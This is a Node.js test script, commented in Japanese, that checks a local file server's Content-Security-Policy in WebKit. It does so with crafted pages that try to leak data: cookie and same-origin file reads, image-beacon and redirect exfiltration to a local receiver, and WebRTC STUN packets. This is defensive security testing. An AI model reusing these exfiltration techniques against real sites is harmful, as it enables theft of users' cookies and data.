#!/usr/bin/env node
// ファイル口が html に付ける CSP を、本物の WebKit（Playwright の WebKit）で確かめる道具（任意。試験の一部ではない）。
// 確かめること：ファイル口で開いた html は、自分の起点の css・画像・script を読めて（見た目が効く）、
// その script が同じ起点のほかのファイルを fetch・iframe・クッキーで読めず、外へも fetch できない。
// 「既知の残り」も測る（CSP では止められない道。FAIL にせず、残っていることを PASS として数える）：
//   - 同じ起点の .js は <script src> で実行でき、グローバル変数が読める（既定でも strict でも残る）
//   - 外の <img> の要求が受け手に届き、読めた値を運べる（既定では届く＝既知の残り。strict では届かない）
//   - 同じ起点の .css のカスタムプロパティが getComputedStyle で読める（NOTE。.json・.md など CSS でないファイルは読めない）
//   - WebRTC（ICE の STUN）が外の UDP の受け手に届く（NOTE。CSP では止められない。アプリの側で RTCPeerConnection を無効にする）
//   - location による外への遷移（NOTE。アプリの WKNavigationDelegate で断る）
//
// 使い方:
//   PLAYWRIGHT_CORE=<playwright-core のフォルダ> node tools/csp-check.mjs [--strict] [--csp "<方針>"] [--no-control]
//   - --strict : サーバーを Context.preview_external=False で起動し、html に厳しい方の CSP が付くことを確かめる
//     （ここは python -c の起動口で Context の既定を替えるだけ。config.json の previewExternal が false のときと同じ形になる）
//   - playwright-core は入れない（npm install しない）。手元にあるものの場所を PLAYWRIGHT_CORE で渡す
//     （無ければ、このフォルダから上の node_modules を探す）。WebKit 本体は、その playwright-core の版に合うもの
//     （npx playwright install webkit で ~/Library/Caches/ms-playwright に入るもの）。無ければ「skipped」と出して 0 で終わる。
//   - 一時の HOME に、使い捨ての一覧サーバー（listserver.py。127.0.0.1・port 0）と、偽のセッション（cwd は一時の起点）を作る。
//     起点には page.html・style.css・img.png・app.js・config.js・other.md・notes.json・pic.svg・nav.html を置く。
//     端末は本物の組み方で組む：置き場に組む符号を作り（bblist.pairing）、動いているサーバーの POST /v1/pair で端末の鍵に替える。
//     その端末の Authorization で rootId と鍵（/v1/filekey。値は `<端末の id>.<鍵>`）を取り、クッキー bb_file
//     （domain 127.0.0.1・path /<rootId>/）を付けて開く。符号・鍵は画面に出さない。
//   - 既定ではサーバーが実際に付ける CSP を確かめる。--csp "<方針>" は、応答の CSP をその方針に差し替えて試す（候補を比べるとき）。
//   - 測る道具の確かめ：「対照」として CSP を外して開き、同じ起点の other.md を fetch で読めてしまう（漏れる）ことを先に見せる。
//     対照で漏れなければ、道具が漏れを見つけられないので FAIL にする（--no-control で省ける）。
// 終わりの値：0 ＝ 全部通った（か飛ばした）、1 ＝ 通らない項目があった。数と挙動は机の上の WebKit のもので、iPad の WKWebView ではない。
import { createRequire } from "node:module";
import { spawn, execFileSync } from "node:child_process";
import dgram from "node:dgram";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const REPO = path.resolve(HERE, "..");
const argv = process.argv.slice(2);
const argValue = (name) => { const i = argv.indexOf(name); return i >= 0 ? argv[i + 1] : undefined; };
const OVERRIDE_CSP = argValue("--csp");
const WITH_CONTROL = !argv.includes("--no-control");
const STRICT = argv.includes("--strict");

function loadPlaywright() {
  const req = createRequire(import.meta.url);
  const where = process.env.PLAYWRIGHT_CORE ? [process.env.PLAYWRIGHT_CORE.replace(/^~(?=\/)/, os.homedir())] : [];
  for (const p of [...where, "playwright-core"]) { try { return req(p); } catch (e) { /* 次へ */ } }
  return null;
}
const pw = loadPlaywright();
if (!pw) { console.log("skipped: playwright-core が見つからない（PLAYWRIGHT_CORE で場所を渡す）"); process.exit(0); }
let browser;
try { browser = await pw.webkit.launch(); } catch (e) { console.log(`skipped: WebKit を起動できない（${String(e.message).split("\n")[0]}）`); process.exit(0); }

const results = [];
const check = (name, ok, detail) => { results.push({ name, ok: !!ok }); console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail !== undefined ? "  " + JSON.stringify(detail) : ""}`); };
const note = (name, detail) => console.log(`NOTE  ${name}  ${JSON.stringify(detail)}`);

// ---- 使い捨ての環境：一時の HOME・起点・偽のセッション ----
const TMP = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "bb-csp-check-")));
const HOME = path.join(TMP, "home");
const SUPPORT = path.join(HOME, "Library", "Application Support", "BridgeBoard");
const LOGS = path.join(HOME, "Library", "Logs", "BridgeBoard");
const PROJECT = path.join(HOME, "Projects", "proj");
const SESSIONS = path.join(HOME, ".claude", "sessions");
for (const d of [SUPPORT, LOGS, PROJECT, SESSIONS]) fs.mkdirSync(d, { recursive: true, mode: 0o700 });
let TOKEN = null;                                    // 組んだ試験の端末の鍵（サーバーが起動してから POST /v1/pair で受け取る）

const OTHER_TEXT = "other-md-secret-body";
const PNG_1x1 = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

// 外への要求の受け手（CORS を許すので、CSP が止めなければ fetch は「読めた」になる）。受けた要求の道（問い合わせ付き）を貯める
const extLog = [];
const ext = http.createServer((req, res) => {
  extLog.push(req.url);
  res.writeHead(200, { "Access-Control-Allow-Origin": "*", "Content-Type": req.url.startsWith("/img") ? "image/png" : "text/plain" });
  res.end(req.url.startsWith("/img") ? PNG_1x1 : "external-body");
});
await new Promise((r) => ext.listen(0, "127.0.0.1", r));
const EXT_ORIGIN = `http://127.0.0.1:${ext.address().port}`;
const EXT_URL = `${EXT_ORIGIN}/ext`;                 // fetch の的
const EXT_IMG = `${EXT_ORIGIN}/img`;                 // <img> で値を運ぶ的
const EXT_NAV = `${EXT_ORIGIN}/nav`;                 // 遷移で値を運ぶ的
const CONFIG_VALUE = "config-js-body";
// WebRTC の ICE（STUN）の受け手。UDP のパケットを数える（CSP は WebRTC を止められない）
const udp = dgram.createSocket("udp4");
let udpPackets = 0;
udp.on("message", () => { udpPackets++; });
await new Promise((r) => udp.bind(0, "127.0.0.1", r));
const UDP_PORT = udp.address().port;

fs.writeFileSync(path.join(PROJECT, "page.html"), `<!doctype html>
<meta charset="utf-8">
<title>start</title>
<link rel="stylesheet" href="style.css">
<p id="t">text</p>
<img id="im" src="img.png">
<script src="app.js"></script>
`);
fs.writeFileSync(path.join(PROJECT, "style.css"), "#t { color: rgb(1, 2, 3); }\n");
fs.writeFileSync(path.join(PROJECT, "img.png"), PNG_1x1);
// app.js：試した結果を document.title に書く。
//   same / external … fetch('other.md')・外への fetch。CSP の違反の知らせ（securitypolicyviolation）も集める（止めたのが CSP だと分かる）
//   frame           … 同じ起点の notes.json を iframe に入れて、中身を読めるか（fetch を止めても、同じオリジンなら iframe で読める）
//   cookie / origin … document.cookie が読めるか（bb_file を読ませない）・window.origin（sandbox なら "null"）
//   script / beacon … config.js を <script src> で読んで、グローバル変数を読めるか（既知の残り）。読めた値を外の <img> で送れるか
fs.writeFileSync(path.join(PROJECT, "app.js"), `
const violations = [];
document.addEventListener("securitypolicyviolation", (e) => violations.push(e.violatedDirective.split(" ")[0]));
const ask = (url) => fetch(url).then((r) => r.text()).then((t) => "read:" + t.slice(0, 24), (e) => "blocked");
const frame = () => new Promise((resolve) => {
  const f = document.createElement("iframe");
  f.src = "notes.json";
  f.onload = () => { try { resolve("read:" + f.contentDocument.body.textContent.slice(0, 24)); } catch (e) { resolve("blocked:" + e.name); } };
  setTimeout(() => resolve("blocked:noload"), 4000);
  document.body.appendChild(f);
});
const cookie = () => { try { return "read:" + document.cookie.split(";").map((c) => c.trim().split("=")[0]).join(","); } catch (e) { return "blocked:" + e.name; } };
const script = () => new Promise((resolve) => {
  const s = document.createElement("script");
  s.src = "config.js";
  s.onload = () => resolve(typeof window.CONFIG_VALUE === "string" ? "read:" + window.CONFIG_VALUE : "blocked:noglobal");
  s.onerror = () => resolve("blocked:error");
  document.head.appendChild(s);
});
const beacon = (value) => new Promise((resolve) => {
  const i = new Image();
  i.onload = i.onerror = () => resolve("settled");
  i.src = ${JSON.stringify(EXT_IMG)} + "?d=" + encodeURIComponent(value);
  setTimeout(() => resolve("timeout"), 1500);
});
Promise.all([ask("other.md"), ask(${JSON.stringify(EXT_URL)}), frame(), script().then((v) => beacon(v.replace(/^read:/, "")).then(() => v))])
  .then(([same, external, frameRead, scriptRead]) => {
    setTimeout(() => { document.title = JSON.stringify({ ran: true, same, external, frame: frameRead, script: scriptRead, cookie: cookie(), origin: window.origin, violations }); }, 50);
  });
`);
fs.writeFileSync(path.join(PROJECT, "config.js"), `window.CONFIG_VALUE = ${JSON.stringify(CONFIG_VALUE)};\n`);
// nav.html：読めた値を持って、外へ遷移する（CSP の default-src では止まらない道。アプリの遷移の判断で断る）
fs.writeFileSync(path.join(PROJECT, "nav.html"), `<!doctype html>
<meta charset="utf-8"><title>nav</title>
<script src="config.js"></script>
<script>location.href = ${JSON.stringify(EXT_NAV)} + "?d=" + encodeURIComponent(window.CONFIG_VALUE);</script>
`);
// probe.html：CSP の外の道を測る。同じ起点の .css のカスタムプロパティ（getComputedStyle）・WebRTC の STUN（外の UDP へ）
fs.writeFileSync(path.join(PROJECT, "theme.css"), ":root { --cfg: css-custom-property-body; }\n");
fs.writeFileSync(path.join(PROJECT, "probe.html"), `<!doctype html>
<meta charset="utf-8"><title>probe</title>
<link rel="stylesheet" href="theme.css">
<script>
const out = {};
let pc = null;
try {
  pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${UDP_PORT}" }] });
  pc.createDataChannel("x");
  pc.createOffer().then((o) => pc.setLocalDescription(o)).catch((e) => { out.rtcError = e.name; });
  out.rtc = "started";
} catch (e) { out.rtc = "unavailable:" + e.name; }
setTimeout(() => {
  out.css = getComputedStyle(document.documentElement).getPropertyValue("--cfg").trim();
  document.title = JSON.stringify(out);
}, 3000);
</script>
`);
fs.writeFileSync(path.join(PROJECT, "other.md"), OTHER_TEXT + "\n");
fs.writeFileSync(path.join(PROJECT, "notes.json"), JSON.stringify({ note: "notes-json-body" }));
fs.writeFileSync(path.join(PROJECT, "pic.svg"), `<svg xmlns="http://www.w3.org/2000/svg" width="40" height="20">
<style>rect { fill: rgb(10, 20, 30); }</style>
<rect id="r" width="40" height="20"/>
<script>document.documentElement.setAttribute("data-ran", "1");</script>
</svg>
`);

// 偽のセッション：この node の PID（生きている）と、その起動時刻（サーバーが ps と突き合わせる）
const procStart = execFileSync("ps", ["-o", "lstart=", "-p", String(process.pid)], { env: { ...process.env, TZ: "UTC", LC_ALL: "C" } })
  .toString().trim().split(/\s+/).join(" ");
fs.writeFileSync(path.join(SESSIONS, `${process.pid}.json`), JSON.stringify({
  pid: process.pid, sessionId: "sid-csp", cwd: PROJECT, procStart, bridgeSessionId: "session_csp", name: "csp", status: "idle",
  updatedAt: Date.now(), statusUpdatedAt: Date.now(), entrypoint: "csp-check",
}));

const serverArgs = ["--host", "127.0.0.1", "--api-port", "0", "--file-port", "0",
  "--claude-dir", path.join(HOME, ".claude"), "--support-dir", SUPPORT, "--log-dir", LOGS];
// --strict：listserver.main を、Context の preview_external を False にして呼ぶ（config.json を使わず、起動口で包んで切り替える）
const STRICT_LAUNCH = "import sys, functools, listserver; "
  + "listserver.Context = functools.partial(listserver.Context, preview_external=False); "
  + "raise SystemExit(listserver.main(sys.argv[1:]))";
const server = spawn(process.env.PYTHON || "python3",
  STRICT ? ["-c", STRICT_LAUNCH, ...serverArgs] : [path.join(REPO, "listserver.py"), ...serverArgs],
  { cwd: REPO, env: { ...process.env, HOME, PYTHONUTF8: "1" }, stdio: "ignore" });
let serverExited = null;
server.on("exit", (code) => { serverExited = code; });

async function cleanup() {
  try { await browser.close(); } catch (e) { /* 閉じ済み */ }
  ext.close();
  udp.close();
  if (serverExited === null) { server.kill("SIGTERM"); await new Promise((r) => { server.on("exit", r); setTimeout(r, 3000); }); }
  fs.rmSync(TMP, { recursive: true, force: true });
}
async function finish(code) { await cleanup(); process.exit(code); }

// 起動したポートは、サーバーの記録から読む（port 0 なので）
let apiPort = null, filePort = null;
for (let i = 0; i < 200 && apiPort === null && serverExited === null; i++) {
  await new Promise((r) => setTimeout(r, 50));
  try {
    const m = fs.readFileSync(path.join(LOGS, "listserver.log"), "utf8").match(/本体 (\d+)・ファイル口 (\d+)/);
    if (m) { apiPort = +m[1]; filePort = +m[2]; }
  } catch (e) { /* まだ無い */ }
}
if (apiPort === null) { check("使い捨てのサーバーが起動する", false, { exited: serverExited }); await finish(1); }

// 端末を組む：置き場に符号を作り（pairing.json。別のプロセスの bbctl pair と同じ）、動いているサーバーの口で端末の鍵に替える
const PYTHON = process.env.PYTHON || "python3";
const pairCode = execFileSync(PYTHON, ["-c",
  "import sys; sys.path.insert(0, sys.argv[1]); from pathlib import Path; from bblist.pairing import Pairing; "
  + "print(Pairing(Path(sys.argv[2])).create())", REPO, SUPPORT], { env: { ...process.env, PYTHONUTF8: "1" } }).toString().trim();
const paired = await fetch(`http://127.0.0.1:${apiPort}/v1/pair`, {
  method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ code: pairCode, deviceName: "csp-check" }) });
const pairedBody = paired.status === 200 ? await paired.json() : {};
TOKEN = pairedBody.token || null;
check("組む口が端末の鍵を返す（POST /v1/pair）", paired.status === 200 && /^[0-9a-f]{16}$/.test(pairedBody.deviceId || "") && !!TOKEN,
  { status: paired.status });
if (TOKEN === null) await finish(1);
const reused = await fetch(`http://127.0.0.1:${apiPort}/v1/pair`, {
  method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ code: pairCode, deviceName: "again" }) });
check("使った符号はもう通らない（403）", reused.status === 403, { status: reused.status });
const api = (p) => fetch(`http://127.0.0.1:${apiPort}${p}`, { headers: { Authorization: `Bearer ${TOKEN}` } });
// 見回り（毎秒）が偽のセッションを拾うのを待って、rootId を引く
let rootId = null;
for (let i = 0; i < 100 && rootId === null; i++) {
  const sessions = await (await api("/v1/sessions")).json();
  const s = sessions.sessions.find((x) => x.bridgeSessionId === "session_csp");
  if (s && s.filesVisible) rootId = s.rootId; else await new Promise((r) => setTimeout(r, 100));
}
note("WebKit の版（Playwright）", { webkit: browser.version() });
check("偽のセッションの起点が見える（rootId を引ける）", rootId !== null, { rootId });
if (rootId === null) await finish(1);
const keyRes = await api(`/v1/filekey?rootId=${rootId}`);
const key = await keyRes.json();
check("/v1/filekey が bb_file と path を返す（値は <端末の id>.<鍵>）",
  keyRes.status === 200 && key.cookie === "bb_file" && key.path === `/${rootId}/` && /^[0-9a-f]{16}\.[0-9a-f]{64}$/.test(key.value)
  && key.value.startsWith(pairedBody.deviceId + "."),
  { status: keyRes.status, cookie: key.cookie, path: key.path, valueLength: (key.value || "").length });

const BASE = `http://127.0.0.1:${filePort}/${rootId}`;
const bare = await fetch(`${BASE}/page.html`);
check("クッキーなしの page.html は 401", bare.status === 401, { status: bare.status });
const withBearer = await fetch(`${BASE}/page.html`, { headers: { Authorization: `Bearer ${TOKEN}` } });
note("サーバーが page.html に付ける CSP", withBearer.headers.get("content-security-policy"));
note("X-Content-Type-Options", withBearer.headers.get("x-content-type-options"));
check("page.html の応答に nosniff", withBearer.headers.get("x-content-type-options") === "nosniff");
const actualCsp = withBearer.headers.get("content-security-policy");
check("page.html の応答に CSP", !!actualCsp, { csp: actualCsp });
check(STRICT ? "strict：html の CSP は default-src 'self' を持つ" : "既定：html の CSP は default-src を持たない（外の読み込みを止めない）",
  !!actualCsp && actualCsp.includes("default-src 'self'") === STRICT, { csp: actualCsp });
const pngRes = await fetch(`${BASE}/img.png`, { headers: { Authorization: `Bearer ${TOKEN}` } });
check("html 以外の中身にも CSP（default-src 'none'; sandbox）", pngRes.headers.get("content-security-policy") === "default-src 'none'; sandbox",
  { csp: pngRes.headers.get("content-security-policy") });

// ---- 開く ----
// mode: "control"（この起点の応答の CSP を全部外す）・"served"（サーバーのまま）・"override"（--csp の方針に差し替え）
async function open(mode, name = "page.html", settle = null) {
  const context = await browser.newContext();
  await context.addCookies([{ name: key.cookie, value: key.value, domain: "127.0.0.1", path: key.path }]);
  const page = await context.newPage();
  const statuses = {}, errors = [];
  page.on("response", (r) => { statuses[new URL(r.url()).pathname.split("/").pop()] = r.status(); });
  page.on("pageerror", (e) => errors.push(`pageerror: ${e.message}`));
  // 対照は、この起点のどの応答からも CSP を外す（html 以外の中身にも CSP が付くので、iframe の中身も読める状態にする）。
  // 差し替えは、開くファイル（html）の応答だけ
  const rewrite = (csp) => async (route) => {
    const resp = await route.fetch();
    const headers = { ...resp.headers() };
    delete headers["content-security-policy"];
    if (csp !== undefined) headers["content-security-policy"] = csp;
    await route.fulfill({ response: resp, headers });
  };
  if (mode === "control") await page.route(`${BASE}/**`, rewrite());
  else if (mode === "override") await page.route(`**/${name}`, rewrite(OVERRIDE_CSP));
  const extBefore = extLog.length;
  await page.goto(`${BASE}/${name}`);
  if (settle) await page.waitForFunction(settle, null, { timeout: 8000 }).catch(() => {});
  // この開き方の間に受け手に届いた要求（道が prefix で始まるもの）
  const reached = (prefix) => extLog.slice(extBefore).filter((u) => u.startsWith(prefix));
  return { context, page, statuses, errors, extHits: () => reached("/ext").length, reached };
}
const titleDone = () => document.title.startsWith("{");
const parseTitle = async (page) => { try { return JSON.parse(await page.title()); } catch (e) { return null; } };
const look = (page) => page.evaluate(() => ({
  color: getComputedStyle(document.getElementById("t")).color,
  imgWidth: document.getElementById("im").naturalWidth,
}));

async function verify(label, mode, expectLeak) {
  const o = await open(mode, "page.html", titleDone);
  const got = await parseTitle(o.page);
  const l = await look(o.page);
  note(`${label}: 読み込みの状態コード`, o.statuses);
  if (o.errors.length) note(`${label}: ページのエラー`, o.errors);
  check(`${label}: css が効く（computed color）`, l.color === "rgb(1, 2, 3)", { color: l.color });
  check(`${label}: 画像が読める（naturalWidth > 0）`, l.imgWidth > 0, { naturalWidth: l.imgWidth });
  check(`${label}: app.js が動く`, got !== null && got.ran === true, got);
  if (expectLeak) {
    check(`${label}: 同じ起点の other.md を fetch で読める（漏れる。道具の確かめ）`, got !== null && got.same.startsWith("read:"), got && got.same);
    check(`${label}: 外への fetch も読める（受け手に届く。道具の確かめ）`, got !== null && got.external.startsWith("read:") && o.extHits() >= 1, { external: got && got.external, hits: o.extHits() });
    check(`${label}: iframe で同じ起点の notes.json の中身を読める（道具の確かめ。名前は拒む名前を避ける：secret. は 404 になる）`, got !== null && got.frame.includes("notes-json-body"), got && got.frame);
    check(`${label}: document.cookie が読める（bb_file が見える。道具の確かめ）`, got !== null && got.cookie.startsWith("read:") && got.cookie.includes("bb_file"), got && got.cookie);
  } else {
    check(`${label}: fetch('other.md') は失敗する`, got !== null && got.same === "blocked", got && got.same);
    check(`${label}: 外への fetch は失敗する`, got !== null && got.external === "blocked", got && got.external);
    check(`${label}: 外の受け手に1件も届かない`, o.extHits() === 0, { hits: o.extHits() });
    check(`${label}: iframe で同じ起点の notes.json を読めない`, got !== null && !got.frame.includes("notes-json-body"), got && got.frame);
    check(`${label}: document.cookie を読めない（bb_file を読ませない）`, got !== null && got.cookie.startsWith("blocked:"), got && got.cookie);
    check(`${label}: オリジンが opaque（window.origin が "null"）`, got !== null && got.origin === "null", got && got.origin);
    note(`${label}: CSP の違反の知らせ`, got && got.violations);
    check(`${label}: 2つの fetch は CSP が止めた（違反の知らせに connect-src）`, got !== null && got.violations.filter((v) => v === "connect-src").length >= 2, got && got.violations);
  }
  // ---- 既知の残り：CSP では止められない道を、あるがままに測る ----
  const overridden = mode === "override";
  const jsRead = got !== null && got.script === `read:${CONFIG_VALUE}`;
  const imgReached = o.reached("/img").length;
  const imgCarried = o.reached("/img").some((u) => u.includes(`d=${CONFIG_VALUE}`));
  note(`${label}: 同じ起点の .js・外の <img> の測定値`, { script: got && got.script, imgRequests: o.reached("/img") });
  if (mode === "control" || overridden) {
    note(`${label}: .js を <script src> で読めた／外の <img> が届いた／値が運ばれた`, { jsRead, imgReached, imgCarried });
  } else {
    // 既知の残り。.js は既定でも strict でも読める（自分の script と同じ型・同じ起点で、CSP は区別できない）。
    // 外の <img> は、既定では届く（既知の残り）、strict では届かない。期待と違えば FAIL（道具か CSP が変わった。文書の直しが要る）
    check(`${label}: 既知の残り：同じ起点の .js をグローバル変数ごと <script src> で読める（CSP では止められない）`, jsRead, got && got.script);
    if (STRICT) {
      check(`${label}: strict：外の <img> の要求が受け手に届かない（値も運ばれない）`, imgReached === 0 && !imgCarried, { imgReached, imgCarried });
    } else {
      check(`${label}: 既知の残り：外の <img> の要求が受け手に届き、読めた値を運べる（strict で止まる）`, imgReached >= 1 && imgCarried, { imgReached, imgCarried });
    }
  }
  await o.context.close();
}

if (WITH_CONTROL) await verify("対照（CSP なし）", "control", true);
if (OVERRIDE_CSP !== undefined) { note("差し替えた CSP", OVERRIDE_CSP); await verify("候補（--csp）", "override", false); }
else await verify("サーバーの CSP", "served", false);

// ---- html 以外の中身（OTHER_CSP）：画像をそのまま開いても表示される ----
{
  const o = await open("served", "img.png");
  const r = await o.page.evaluate(() => ({ images: document.images.length, width: document.images[0] ? document.images[0].naturalWidth : 0 }));
  check("画像を直接開いても表示される（default-src 'none'; sandbox が付いても）", r.images === 1 && r.width > 0, r);
  await o.context.close();
}

// ---- 遷移：CSP では止まらない道。測って NOTE にする（FAIL にしない） ----
{
  const o = await open("served", "nav.html");
  for (let i = 0; i < 30 && o.reached("/nav").length === 0; i++) await o.page.waitForTimeout(100);
  const urls = o.reached("/nav");
  note("既知の残り（CSP の外）：location による外への遷移が受け手に届く／値が運ばれる", { reached: urls.length > 0, carried: urls.some((u) => u.includes(`d=${CONFIG_VALUE}`)) });
  await o.context.close();
}

// ---- CSP の外の道（NOTE だけ。FAIL にしない）：同じ起点の .css のカスタムプロパティ・WebRTC の STUN ----
{
  const before = udpPackets;
  const o = await open("served", "probe.html", titleDone);
  const got = await parseTitle(o.page);
  await o.page.waitForTimeout(300);
  note("既知の残り（CSP の外）：同じ起点の .css のカスタムプロパティを getComputedStyle で読める", { value: got && got.css });
  note("既知の残り（CSP の外）：WebRTC の STUN が外の UDP の受け手に届く（CSP では止められない）", { rtc: got && got.rtc, packetsReceived: udpPackets - before });
  await o.context.close();
}

// ---- svg：script は動かず、style は効く ----
{
  const o = await open("served", "pic.svg");
  await o.page.waitForTimeout(500);
  const r = await o.page.evaluate(() => ({ ran: document.documentElement.getAttribute("data-ran"), fill: getComputedStyle(document.getElementById("r")).fill }));
  note("pic.svg の応答の CSP", (await (await fetch(`${BASE}/pic.svg`, { headers: { Authorization: `Bearer ${TOKEN}` } })).headers.get("content-security-policy")));
  check("svg: script は動かない", r.ran === null, r);
  check("svg: 中の style は効く", r.fill === "rgb(10, 20, 30)", r);
  await o.context.close();
}

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} 通った`);
await finish(failed.length ? 1 : 0);
